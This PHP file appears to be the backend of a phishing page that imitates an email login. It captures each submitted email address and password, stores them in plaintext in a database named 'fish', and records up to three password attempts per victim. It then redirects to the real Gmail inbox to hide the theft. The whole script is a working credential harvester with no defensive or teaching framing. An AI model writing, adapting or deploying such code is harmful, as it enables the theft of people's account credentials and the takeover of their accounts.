<?php

if(empty($_POST) == false) {

	var_dump($_POST);

	$pdo = new PDO('mysql:host=localhost;dbname=fish', 'root', 'troiswa');

	// Paramétrage de la liaison PHP <-> MySQL, les données sont encodées en UTF-8.
	$pdo->exec('SET NAMES UTF8');


	$query = $pdo->prepare
	(
	    'SELECT * FROM user WHERE mail = ?'
	);

	$query->execute(array($_POST['email']));

	$user = $query->fetch(PDO::FETCH_ASSOC);

	//var_dump($user);

	if(empty($user['test']) == false) {
		$test = intval($user['test']) + 1;
		//var_dump($test);

		if($test > 3) {

			header('Location: http://www.inddsdscex.com'); 
			exit(); 

		} else {

				$query = $pdo->prepare
			(
			    'UPDATE user
						SET test = ?, password'.strval($test).'= ?
	  			
						WHERE id = ?'
			);

			$query->execute(array(strval($test), $_POST['psw'],  $user['id']));
			header('Location: https://mail.google.com/mail'); 
			exit();
		}


	} else {

		$query = $pdo->prepare
		(
		    'INSERT INTO
		     user(mail, password1, test) 
		     VALUES (?, ?, 1)'
		);

		$query->execute(array($_POST['email'], $_POST['psw']));
		header('Location: https://mail.google.com/mail'); 
		exit(); 
	}



}





?>